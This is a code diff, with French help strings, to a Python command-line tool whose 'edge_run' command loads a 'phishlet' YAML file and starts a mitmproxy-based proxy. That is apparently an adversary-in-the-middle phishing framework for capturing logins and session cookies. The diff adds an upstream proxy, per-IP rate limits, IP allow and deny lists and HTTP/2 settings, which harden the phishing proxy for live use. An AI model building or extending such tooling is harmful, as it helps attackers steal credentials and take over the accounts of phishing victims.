@@ -129,7 +129,13 @@ def edge_preset(host, port):
 @click.option("--path", help="Chemin vers un phishlet YAML")
 @click.option("--host", default="0.0.0.0")
 @click.option("--port", default=8443, type=int)
-def edge_run(name, path, host, port):
+@click.option("--upstream", help="Proxy HTTP amont ex: http://user:pass@host:3128")
+@click.option("--rate", type=int, help="Limite de requêtes par minute par IP")
+@click.option("--allow-ips", help="Liste CSV d'IPs autorisées")
+@click.option("--deny-ips", help="Liste CSV d'IPs refusées")
+@click.option("--http2/--no-http2", default=True, help="Activer HTTP/2 (par défaut)")
+@click.option("--conn-strategy", default="lazy", help="Stratégie de connexion mitmproxy (lazy|eager)")
+def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2, conn_strategy):
     try:
         from core.edge.proxy import EdgeProxy, EdgeConfig
         import asyncio
@@ -140,7 +146,18 @@ def edge_run(name, path, host, port):
             return
         with open(path, "r") as f:
             ph_yaml = f.read()
+        # Environnement réseau
+        if rate is not None:
+            os.environ["RATE_LIMIT_PER_MINUTE"] = str(rate)
+        if allow_ips is not None:
+            os.environ["ALLOW_IPS"] = allow_ips
+        if deny_ips is not None:
+            os.environ["DENY_IPS"] = deny_ips
         cfg = EdgeConfig(listen_host=host, listen_port=port)
+        cfg.http2 = bool(http2)
+        cfg.connection_strategy = conn_strategy
+        if upstream:
+            cfg.upstream_http = upstream
         proxy = EdgeProxy(cfg)
         console.print(f"[yellow]Starting Edge with {path}[/yellow]")
         asyncio.run(proxy.start(ph_yaml))
